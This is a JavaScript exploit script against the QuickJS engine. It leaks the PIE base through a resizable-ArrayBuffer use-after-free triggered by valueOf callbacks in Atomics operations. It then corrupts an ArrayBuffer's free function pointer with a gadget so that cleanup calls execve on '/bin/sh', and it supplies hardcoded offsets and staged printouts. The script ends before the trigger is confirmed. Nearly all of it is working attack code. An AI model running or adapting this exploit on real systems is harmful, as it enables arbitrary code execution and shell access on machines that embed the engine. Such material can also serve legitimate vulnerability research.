// Exploit v17: Use gadget to call my_execvpe with controlled args
print("=== QuickJS Shell Exploit ===");

function hex64(bigint) {
    if (bigint < 0n) return "-0x" + (-bigint).toString(16);
    return "0x" + bigint.toString(16).padStart(16, '0');
}

// Offsets
const FREE_FUNC_OFFSET = 0x14bc0n;     // js_array_buffer_free
const MY_EXECVPE_OFFSET = 0xc8fb0n;    // my_execvpe.isra.0
const GADGET_OFFSET = 0x36736n;         // lea rdi, [rdx + 0x20] ; call qword ptr [rdx]

let blockers = [];

// ========================================
// STEP 1: Leak PIE base
// ========================================
print("[1] Leaking PIE base...");

for (let i = 0; i < 100; i++) blockers.push(new ArrayBuffer(56));

let ab1 = new ArrayBuffer(56, { maxByteLength: 1024 });
let view1 = new BigInt64Array(ab1);
for (let i = 0; i < 7; i++) view1[i] = 0n;

for (let i = 0; i < 30; i++) blockers.push(new ArrayBuffer(56));

let mal1 = {
    valueOf: function() {
        ab1.resize(1024);
        for (let i = 0; i < 5; i++) blockers.push(new ArrayBuffer(128));
        return 0n;
    }
};

let free_func = Atomics.add(view1, 6, mal1);
let pie_base = free_func - FREE_FUNC_OFFSET;
print("PIE base: " + hex64(pie_base));

let my_execvpe = pie_base + MY_EXECVPE_OFFSET;
let gadget = pie_base + GADGET_OFFSET;
print("my_execvpe: " + hex64(my_execvpe));
print("gadget: " + hex64(gadget));

// ========================================
// STEP 2: Create victim and corrupt free_func
// ========================================
print("\n[2] Setting up shell execution...");

// We need victim's data buffer to contain:
// - offset 0: my_execvpe address (8 bytes)
// - offset 0x20 (32): "/bin/sh\0"

// So data size needs to be at least 40 bytes
// JSArrayBuffer struct is 56 bytes

// Create the corrupter buffer
let ab2 = new ArrayBuffer(56, { maxByteLength: 1024 });
let view2 = new BigInt64Array(ab2);
for (let i = 0; i < 7; i++) view2[i] = 0n;

for (let i = 0; i < 100; i++) blockers.push(new ArrayBuffer(56));

let victimRef = null;

let mal2 = {
    valueOf: function() {
        ab2.resize(1024);

        // Create victim with 64 bytes of data
        // The JSArrayBuffer struct (56 bytes) will land in freed slot
        let victim = new ArrayBuffer(64);

        // Set up the data buffer content
        let v64 = new BigInt64Array(victim);
        v64[0] = my_execvpe;  // data[0] = my_execvpe address

        // Set up "/bin/sh" at offset 0x20 (32 bytes)
        let v8 = new Uint8Array(victim);
        v8[0x20] = 0x2F;  // /
        v8[0x21] = 0x62;  // b
        v8[0x22] = 0x69;  // i
        v8[0x23] = 0x6E;  // n
        v8[0x24] = 0x2F;  // /
        v8[0x25] = 0x73;  // s
        v8[0x26] = 0x68;  // h
        v8[0x27] = 0x00;  // null

        victimRef = victim;  // Keep reference

        return gadget;  // Write gadget address to free_func
    }
};

// Corrupt offset 48 (free_func) - index 6 in BigInt64Array
let old_free_func = Atomics.exchange(view2, 6, mal2);
print("Corrupted free_func from " + hex64(old_free_func) + " to gadget");

print("\n[3] Triggering cleanup...");
print("The gadget will:");
print("  - Set rdi = data + 0x20 (pointer to '/bin/sh')");
print("  - Call [data + 0] = my_execvpe('/bin/sh', NULL, data)");
print("  - my_execvpe will call execve('/bin/sh', NULL, data)");

// Trigger cleanup by dropping references
// The corrupted ArrayBuffer will be freed when GC runs
// For now, let's see if it triggers at exit
